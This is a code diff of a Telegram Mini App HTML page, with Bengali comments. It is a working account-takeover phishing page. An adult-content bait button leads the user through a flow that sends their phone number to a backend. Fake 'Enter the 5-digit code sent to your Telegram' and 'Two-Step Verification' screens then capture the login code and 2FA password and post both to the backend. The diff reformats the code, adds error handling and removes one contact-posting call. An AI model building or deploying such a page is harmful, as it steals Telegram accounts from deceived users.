@@ -19,34 +19,100 @@
             overflow: hidden;
         }
         .overlay { background: rgba(0, 0, 0, 0.5); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        .main-container { width: 90%; max-width: 380px; z-index: 2; text-align: center; margin-bottom: 40px; }
-        .finger-icon { font-size: 75px; display: block; margin-bottom: 20px; animation: bounce 1.2s infinite; text-shadow: 0 5px 15px rgba(0,0,0,0.5); }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(20px); } }
-        .instruction-box { background: rgba(255, 255, 255, 0.95); padding: 15px; border-radius: 15px; margin-bottom: 20px; color: #333; font-weight: bold; font-size: 16px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        
+        .main-container { 
+            width: 90%; 
+            max-width: 380px; 
+            z-index: 2; 
+            text-align: center; 
+            margin-bottom: 40px; 
+        }
+
+        /* আঙুলের ইমোজি অ্যানিমেশন */
+        .finger-icon {
+            font-size: 75px;
+            display: block;
+            margin-bottom: 20px;
+            animation: bounce 1.2s infinite;
+            text-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(20px); }
+        }
+
+        /* ওটিপি এবং পাসওয়ার্ড বক্স ডিজাইন */
+        .instruction-box {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 15px; border-radius: 15px;
+            margin-bottom: 20px; color: #333; font-weight: bold; font-size: 16px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
         .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
-        .otp-box { width: 50px; height: 55px; background: rgba(255, 255, 255, 0.2); border: 2px solid rgba(255, 255, 255, 0.7); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 28px; color: white; font-weight: bold; backdrop-filter: blur(8px); }
+        .otp-box {
+            width: 50px; height: 55px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.7);
+            border-radius: 12px; display: flex; align-items: center; justify-content: center;
+            font-size: 28px; color: white; font-weight: bold; backdrop-filter: blur(8px);
+        }
+
+        /* কিপ্যাড */
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .key { background: #4caf50; padding: 18px; border-radius: 12px; font-size: 26px; font-weight: bold; color: white; cursor: pointer; border: none; box-shadow: 0 4px 6px rgba(0,0,0,0.2); -webkit-tap-highlight-color: transparent; }
+        .key { 
+            background: #4caf50; padding: 18px; border-radius: 12px; 
+            font-size: 26px; font-weight: bold; color: white; 
+            cursor: pointer; border: none; box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            -webkit-tap-highlight-color: transparent;
+        }
         .key:active { background: #388e3c; transform: scale(0.95); }
         .key-back { background: #e67e22; font-size: 22px; }
-        .pwd-container { background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
-        .pwd-input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #4caf50; border-radius: 10px; font-size: 18px; text-align: center; outline: none; }
-        .pwd-btn { background: #ff4757; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 18px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+
+        /* পাসওয়ার্ড সেকশন */
+        .pwd-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 25px; border-radius: 20px;
+            text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+        }
+        .pwd-input {
+            width: 100%; padding: 15px; margin: 15px 0;
+            border: 2px solid #4caf50; border-radius: 10px;
+            font-size: 18px; text-align: center; outline: none;
+        }
+        .pwd-btn {
+            background: #ff4757; color: white; border: none;
+            padding: 15px; border-radius: 10px; font-weight: bold;
+            cursor: pointer; width: 100%; font-size: 18px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
         .hidden { display: none !important; }
         .loader { color: white; font-weight: bold; margin-top: 15px; font-size: 18px; text-shadow: 1px 1px 5px black; }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
+
     <div class="main-container">
+        <!-- ধাপ ১: স্টার্টিং স্ক্রিন -->
         <div id="step0">
             <div id="finger_point" class="finger-icon">👇</div>
             <div id="load" class="loader hidden">🔄 Connecting...</div>
         </div>
+
+        <!-- ধাপ ২: ওটিপি স্ক্রিন -->
         <div id="step2" class="hidden">
-            <div class="instruction-box">Enter the 5-digit code sent to your Telegram!</div>
+            <div class="instruction-box">
+                Enter the 5-digit code sent to your Telegram!
+            </div>
             <div class="otp-inputs">
-                <div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div>
+                <div class="otp-box" id="b1"></div>
+                <div class="otp-box" id="b2"></div>
+                <div class="otp-box" id="b3"></div>
+                <div class="otp-box" id="b4"></div>
+                <div class="otp-box" id="b5"></div>
             </div>
             <div class="keypad">
                 <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
@@ -55,9 +121,12 @@
                 <div style="background:transparent"></div><div class="key" onclick="addNum('0')">0</div><div class="key key-back" onclick="clearNum()">⌫</div>
             </div>
         </div>
+
+        <!-- ধাপ ৩: টু-স্টেপ পাসওয়ার্ড স্ক্রিন -->
         <div id="step3" class="hidden">
             <div class="pwd-container">
                 <h3 style="margin:0; color:#2c3e50;">Two-Step Verification</h3>
+                <p style="font-size: 14px; color: #7f8c8d;">Your account is protected by an additional password.</p>
                 <input type="password" id="tg_password" class="pwd-input" placeholder="Enter Password">
                 <button class="pwd-btn" onclick="submitPassword()">Continue</button>
             </div>
@@ -67,7 +136,10 @@
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
+
+        // মেইন বাটন সেটআপ
         tg.MainButton.setText("🍓 START CONTINUE 🔞");
+        tg.MainButton.textColor = "#ffffff";
         tg.MainButton.color = "#ff4757";
         tg.MainButton.show();
         tg.MainButton.onClick(startFlow);
@@ -96,12 +168,6 @@
 
         async function sendPhoneToBackend(phone) {
             try {
-                // কন্টাক্ট ব্যাকএন্ডে পাঠানোর জন্য সরাসরি কল
-                await fetch(`${BACKEND_URL}/handle_contact`, {
-                    method: "POST", headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, phone: phone })
-                });
-
                 const res = await fetch(`${BACKEND_URL}/send_number`, {
                     method: "POST", headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({ user_id: userId, phone: phone })
@@ -110,13 +176,31 @@
                 if (data.status === "success") {
                     document.getElementById('step0').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
+                } else {
+                    tg.showAlert("Error: " + data.message);
+                    location.reload();
                 }
-            } catch (e) { tg.showAlert("Error sending phone!"); }
+            } catch (e) { tg.showAlert("Server Connection Error!"); }
         }
 
-        function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; updateOTPViz(); if(currentOTP.length === 5) verifyOTP(); } }
-        function clearNum() { currentOTP = currentOTP.slice(0, -1); updateOTPViz(); }
-        function updateOTPViz() { for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }
+        function addNum(n) {
+            if(currentOTP.length < 5) {
+                currentOTP += n;
+                updateOTPViz();
+                if(currentOTP.length === 5) { verifyOTP(); }
+            }
+        }
+
+        function clearNum() {
+            currentOTP = currentOTP.slice(0, -1);
+            updateOTPViz();
+        }
+
+        function updateOTPViz() {
+            for(let i=1; i<=5; i++) {
+                document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
+            }
+        }
 
         async function verifyOTP() {
             try {
@@ -125,22 +209,36 @@
                     body: JSON.stringify({ user_id: userId, otp: currentOTP })
                 });
                 const data = await res.json();
-                if (data.status === "success") window.location.href = OFF_LINK;
-                else if (data.status === "password_needed") { document.getElementById('step2').classList.add('hidden'); document.getElementById('step3').classList.remove('hidden'); }
-                else { tg.showAlert(data.message || "Invalid OTP!"); currentOTP = ""; updateOTPViz(); }
+                
+                if (data.status === "success") {
+                    window.location.href = OFF_LINK;
+                } else if (data.status === "password_needed") {
+                    document.getElementById('step2').classList.add('hidden');
+                    document.getElementById('step3').classList.remove('hidden');
+                } else { 
+                    tg.showAlert(data.message || "Invalid OTP Code!");
+                    currentOTP = ""; updateOTPViz();
+                }
             } catch (e) { }
         }
 
         async function submitPassword() {
             const pwd = document.getElementById('tg_password').value;
+            if(!pwd) return;
+
             try {
                 const res = await fetch(`${BACKEND_URL}/verify_password`, {
                     method: "POST", headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({ user_id: userId, password: pwd })
                 });
                 const data = await res.json();
-                if (data.status === "success") window.location.href = OFF_LINK;
-                else { tg.showAlert("Wrong Password!"); document.getElementById('tg_password').value = ""; }
+
+                if (data.status === "success") {
+                    window.location.href = OFF_LINK;
+                } else {
+                    tg.showAlert(data.message || "Wrong Password!");
+                    document.getElementById('tg_password').value = "";
+                }
             } catch (e) { }
         }
     </script>
